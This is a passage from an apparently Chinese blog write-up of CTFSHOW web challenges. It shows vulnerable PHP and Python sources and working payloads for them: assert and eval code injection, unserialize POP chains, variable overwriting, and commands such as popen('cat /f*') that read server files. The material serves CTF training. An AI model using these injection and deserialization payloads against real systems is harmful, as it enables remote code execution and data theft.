class=\"number\">35</span>):</span><br><span class=\"line\">    t+=s[i]+<span class=\"string\">&quot;=&quot;</span>+s[i+<span class=\"number\">1</span>]+<span class=\"string\">&#x27;&amp;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">t+=s[i]+<span class=\"string\">&#x27;=&#x27;</span>+code</span><br><span class=\"line\"><span class=\"built_in\">print</span>(t)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_=a&amp;a=b&amp;b=c&amp;c=d&amp;d=e&amp;e=f&amp;f=g&amp;g=h&amp;h=i&amp;i=j&amp;j=k&amp;k=l&amp;l=m&amp;m=n&amp;n=o&amp;o=p&amp;p=q&amp;q=r&amp;r=s&amp;s=t&amp;t=u&amp;u=v&amp;v=w&amp;w=x&amp;x=y&amp;y=z&amp;z=A&amp;A=B&amp;B=C&amp;C=D&amp;D=E&amp;E=F&amp;F=G&amp;G=H&amp;H=I&amp;I=J&amp;I=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"一言既出\"><a href=\"#一言既出\" class=\"headerlink\" title=\"一言既出\"></a>一言既出</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">highlight_file(__FILE__); </span><br><span class=\"line\">include &quot;flag.php&quot;;  </span><br><span class=\"line\">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    if ($_GET[&#x27;num&#x27;] == 114514)&#123;</span><br><span class=\"line\">        assert(&quot;intval($_GET[num])==1919810&quot;) or die(&quot;一言既出，驷马难追!&quot;);</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>assert里面如果是字符串的话，会将字符串当作php代码执行，与eval不同的一点是，结尾不需要分号</p>\n</blockquote>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=114514);//      将前面闭合并且注释掉后面的部分（妙啊）</span><br><span class=\"line\"></span><br><span class=\"line\">?num=114514%2b1805296     %2b为加号url编码，两个相加等于1919810</span><br><span class=\"line\"></span><br><span class=\"line\">?num=114514);1919810    跟第一种方法类似</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"驷马难追\"><a href=\"#驷马难追\" class=\"headerlink\" title=\"驷马难追\"></a>驷马难追</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;flag.php&quot;</span>;  </span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>]))&#123;</span><br><span class=\"line\">     <span class=\"keyword\">if</span> (<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>] == <span class=\"number\">114514</span> &amp;&amp; <span class=\"title function_ invoke__\">check</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>]))&#123;</span><br><span class=\"line\">              <span class=\"title function_ invoke__\">assert</span>(<span class=\"string\">&quot;intval(<span class=\"subst\">$_GET</span>[num])==1919810&quot;</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">&quot;一言既出，驷马难追!&quot;</span>);</span><br><span class=\"line\">              <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">     &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span>(<span class=\"params\"><span class=\"variable\">$str</span></span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> !<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/[a-z]|\\;|\\(|\\)/&quot;</span>,<span class=\"variable\">$str</span>);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>相较于上一个题，过滤了字母，分号，括号，仍然可以用%2b绕过</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=114514%2b1805296</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"TapTapTap\"><a href=\"#TapTapTap\" class=\"headerlink\" title=\"TapTapTap\"></a>TapTapTap</h2><p>F12控制台求值，flag在</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/secret_path_you_do_not_know/secretfile.txt</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"webshell\"><a href=\"#webshell\" class=\"headerlink\" title=\"webshell\"></a>webshell</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Webshell</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"variable\">$cmd</span> = <span class=\"string\">&#x27;echo &quot;Hello World!&quot;&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">init</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">init</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/flag/i&#x27;</span>, <span class=\"variable\">$this</span>-&gt;cmd)) &#123;</span><br><span class=\"line\">                <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">exec</span>(<span class=\"variable\">$this</span>-&gt;cmd);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">exec</span>(<span class=\"params\"><span class=\"variable\">$cmd</span></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">shell_exec</span>(<span class=\"variable\">$cmd</span>);</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable\">$result</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$serializecmd</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$unserializecmd</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$serializecmd</span>);</span><br><span class=\"line\">        <span class=\"variable\">$unserializecmd</span>-&gt;<span class=\"title function_ invoke__\">init</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n\n<p>一到简单的反序列化题目</p>\n<p>目标点在webshell类上的init函数，反序列化后直接执行。。。</p>\n<p>exp</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Webshell</span> </span>&#123;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"variable\">$cmd</span> = <span class=\"string\">&#x27;cat f*&#x27;</span>;</span><br><span class=\"line\">        </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">Webshell</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br><span class=\"line\"><span class=\"comment\">// O:8:&quot;Webshell&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;cat f*&quot;;&#125; </span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"化零为整\"><a href=\"#化零为整\" class=\"headerlink\" title=\"化零为整\"></a>化零为整</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include &quot;flag.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">$result=&#x27;&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">for ($i=1;$i&lt;=count($_GET);$i++)&#123;</span><br><span class=\"line\">    if (strlen($_GET[$i])&gt;1)&#123;</span><br><span class=\"line\">        die(&quot;你太长了！！&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">    $result=$result.$_GET[$i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if ($result ===&quot;大牛&quot;)&#123;</span><br><span class=\"line\">    echo $flag;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>中文在php里面长度是3，其实很容易想到中文的url编码就是3个</p>\n<p>我们将大牛进行url编码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%E5%A4%A7%E7%89%9B</span><br></pre></td></tr></table></figure>\n\n\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"无一幸免\"><a href=\"#无一幸免\" class=\"headerlink\" title=\"无一幸免\"></a>无一幸免</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">include &quot;flag.php&quot;;</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">if (isset($_GET[&#x27;0&#x27;]))&#123;</span><br><span class=\"line\">    $arr[$_GET[&#x27;0&#x27;]]=1;</span><br><span class=\"line\">    if ($arr[]=1)&#123;</span><br><span class=\"line\">        die($flag);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">        die(&quot;nonono!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>代码部分7，8行条件判断，这里$arr[]&#x3D;1是个赋值操作，也就是说代码走到这里if条件始终为ture，可以die出flag，那么给0可随便赋值。空值也无所谓。</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?0=0</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"传说之下（雾）\"><a href=\"#传说之下（雾）\" class=\"headerlink\" title=\"传说之下（雾）\"></a>传说之下（雾）</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var nowScore = this.score += 1</span><br></pre></td></tr></table></figure>\n\n<p>js代码中第275行，将这个改为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var nowScore = this.score += 2077</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"算力超群\"><a href=\"#算力超群\" class=\"headerlink\" title=\"算力超群\"></a>算力超群</h2><p>抓个包先</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /_calculate?number1=5&amp;operator=*&amp;number2=6 HTTP/1.1</span><br></pre></td></tr></table></figure>\n\n<p>传递了3个参数，我们分别对这个三个参数污染一下</p>\n<p>发现number1,operator都有过滤，对number2时直接报错了</p>\n<p>直接对number2 RCE</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/_calculate?number1=5&amp;operator=*&amp;number2=__import__(&#x27;os&#x27;).popen(&#x27;cat /f*&#x27;).read()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"遍地飘零\"><a href=\"#遍地飘零\" class=\"headerlink\" title=\"遍地飘零\"></a>遍地飘零</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">include &quot;flag.php&quot;;</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">$zeros=&quot;000000000000000000000000000000&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class=\"line\">    $$key=$$value;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if ($flag==&quot;000000000000000000000000000000&quot;)&#123;</span><br><span class=\"line\">    echo &quot;好多零&quot;;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;没有零，仔细看看输入有什么问题吧&quot;;</span><br><span class=\"line\">    var_dump($_GET);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>本题考察的是变量覆盖</p>\n<p>我们传入?_GET&#x3D;flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var_dump($_GET);=&gt;  var_dump($flag);</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"茶歇区\"><a href=\"#茶歇区\" class=\"headerlink\" title=\"茶歇区\"></a>茶歇区</h2><p>抓包</p>\n<p>没怎么搞懂，看wp说是php整数溢出，</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=0&amp;b=0&amp;c=0&amp;d=0&amp;e=999999999999999999&amp;submit=%E5%8D%B7%E4%BA%86%E5%B0%B1%E8%B7%91%EF%BC%81</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"小舔田\"><a href=\"#小舔田\" class=\"headerlink\" title=\"小舔田\"></a>小舔田</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">include &quot;flag.php&quot;;</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">class Moon&#123;</span><br><span class=\"line\">    public $name=&quot;月亮&quot;;</span><br><span class=\"line\">    public function __toString()&#123;</span><br><span class=\"line\">        return $this-&gt;name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    public function __wakeup()&#123;</span><br><span class=\"line\">        echo &quot;我是&quot;.$this-&gt;name.&quot;快来赏我&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Ion_Fan_Princess&#123;</span><br><span class=\"line\">    public $nickname=&quot;牛夫人&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function call()&#123;</span><br><span class=\"line\">        global $flag;</span><br><span class=\"line\">        if ($this-&gt;nickname==&quot;小甜甜&quot;)&#123;</span><br><span class=\"line\">            echo $flag;</span><br><span class=\"line\">        &#125;else&#123;</span><br><span class=\"line\">            echo &quot;以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家&quot;.$this-&gt;nickname.&quot;。\\n&quot;;</span><br><span class=\"line\">            echo &quot;你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\\n&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    public function __toString()&#123;</span><br><span class=\"line\">        $this-&gt;call();</span><br><span class=\"line\">        return &quot;\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t----&quot;.$this-&gt;nickname;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if (isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class=\"line\">    unserialize($_GET[&#x27;code&#x27;]);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    $a=new Ion_Fan_Princess();</span><br><span class=\"line\">    echo $a;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>在Ion_Fan_Princess类下的 call函数可以 echo $flag</p>\n<p>Ion_Fan_Princess类的__toString可以出发call函数</p>\n<p>Moon类 下的 __wakeup可以触发 ____toString</p>\n<p>pop链</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Moon::__wakeup =&gt; Ion_Fan_Princess::__toString =&gt; Ion_Fan_Princess::call</span><br></pre></td></tr></table></figure>\n\n\n\n<p>exp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">class Moon&#123;</span><br><span class=\"line\">    public $name;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Ion_Fan_Princess&#123;</span><br><span class=\"line\">    public $nickname=&quot;小甜甜&quot;;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a=new Moon;</span><br><span class=\"line\">$b=new Ion_Fan_Princess;</span><br><span class=\"line\">$a-&gt;name=$b;</span><br><span class=\"line\"></span><br><span class=\"line\">echo serialize($a);</span><br><span class=\"line\">//  &lt;?php</span><br><span class=\"line\">class Moon&#123;</span><br><span class=\"line\">    public $name;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Ion_Fan_Princess&#123;</span><br><span class=\"line\">    public $nickname=&quot;小甜甜&quot;;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a=new Moon;</span><br><span class=\"line\">$b=new Ion_Fan_Princess;</span><br><span class=\"line\">$a-&gt;name=$b;</span><br><span class=\"line\"></span><br><span class=\"line\">echo serialize($a);</span><br><span class=\"line\">// O:4:&quot;Moon&quot;:1:&#123;s:4:&quot;name&quot;;O:16:&quot;Ion_Fan_Princess&quot;:1:&#123;s:8:&quot;nickname&quot;;s:9:&quot;小甜甜&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?code=O:4:&quot;Moon&quot;:1:&#123;s:4:&quot;name&quot;;O:16:&quot;Ion_Fan_Princess&quot;:1:&#123;s:8:&quot;nickname&quot;;s:9:&quot;小甜甜&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"CTFSHOW-菜狗杯\"><a href=\"#CTFSHOW-菜狗杯\" class=\"headerlink\" title=\"CTFSHOW_菜狗杯\"></a>CTFSHOW_菜狗杯</h1><h2 id=\"web签到\"><a href=\"#web签到\" class=\"headerlink\" title=\"web签到\"></a>web签到</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"variable\">$_GET</span>[<span class=\"variable\">$_POST</span>[<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;CTFshow-QQ群:&#x27;</span>]]]][<span class=\"number\">6</span>][<span class=\"number\">0</span>][<span class=\"number\">7</span>][<span class=\"number\">5</span>][<span class=\"number\">8</span>][<span class=\"number\">0</span>][<span class=\"number\">9</span>][<span 